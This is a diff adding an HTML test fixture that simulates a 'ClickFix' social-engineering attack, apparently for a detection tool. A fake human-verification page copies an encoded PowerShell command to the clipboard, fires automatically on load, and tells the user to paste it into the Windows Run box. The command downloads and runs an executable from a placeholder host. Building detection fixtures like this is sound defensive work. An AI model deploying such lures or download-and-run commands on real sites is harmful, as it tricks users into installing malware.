@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickFix Modern - Test Fixture</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+            background: #f5f5f5;
+        }
+        .captcha-box {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .btn {
+            background: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        .instructions {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 4px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-box">
+        <h2>🔒 Security Verification Required</h2>
+        <p>Please verify you are human to continue</p>
+        <button id="verifyBtn" class="btn">Verify I'm Human</button>
+        <div id="instructions" class="instructions">
+            <strong>To complete verification:</strong>
+            <ol style="text-align: left;">
+                <li>Press <kbd>Windows + R</kbd></li>
+                <li>Press <kbd>Ctrl + V</kbd></li>
+                <li>Press <kbd>Enter</kbd></li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        // Simulate modern ClickFix attack using navigator.clipboard.writeText()
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            try {
+                // Malicious PowerShell command (Base64 encoded)
+                const maliciousCommand = 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAGMAbABpAGUAbgB0AC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIALAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQAiAA==';
+
+                // Copy malicious command to clipboard (PRIMARY CLICKFIX VECTOR)
+                await navigator.clipboard.writeText(maliciousCommand);
+
+                // Show instructions
+                document.getElementById('instructions').style.display = 'block';
+                this.textContent = '✓ Copied to Clipboard';
+                this.disabled = true;
+
+                console.log('[ClickFix] Malicious payload copied to clipboard');
+            } catch (err) {
+                console.error('[ClickFix] Failed to copy:', err);
+                alert('Verification failed. Please enable clipboard permissions.');
+            }
+        });
+
+        // Auto-trigger after page load to simulate aggressive malware
+        setTimeout(function() {
+            document.getElementById('verifyBtn').click();
+        }, 500);
+    </script>
+</body>
+</html>
